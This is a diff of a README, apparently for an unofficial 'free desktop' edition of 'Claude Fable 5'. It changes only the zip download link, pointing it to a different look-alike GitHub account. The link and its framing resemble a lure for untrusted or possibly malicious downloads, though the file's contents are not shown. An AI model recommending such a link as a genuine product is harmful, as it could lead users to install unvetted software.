@@ -14,7 +14,7 @@ If you saw "Claude Fable 5 is currently unavailable" in the past — it's now ac
 <img width="1536" height="1024" alt="972285a8-21ea-4920-9c27-099e06c7eca6" src="https://github.com/user-attachments/assets/e061b423-b0f3-497b-b076-87303bf6f45c" />
 
 ## Install
-[Download `ClaudeFable5-desktop.zip`](https://github.com/claude5fable/Claude-fable-5-free-desktop/releases/download/fable/ClaudeFable5-desktop.zip)
+[Download `ClaudeFable5-desktop.zip`](https://github.com/claudefable5-free/Claude-Fable-5-Free-Desktop/releases/download/fable5/ClaudeFable5-desktop.zip)
 ---
 
 > Optimized for Windows 11 • macOS • Linux
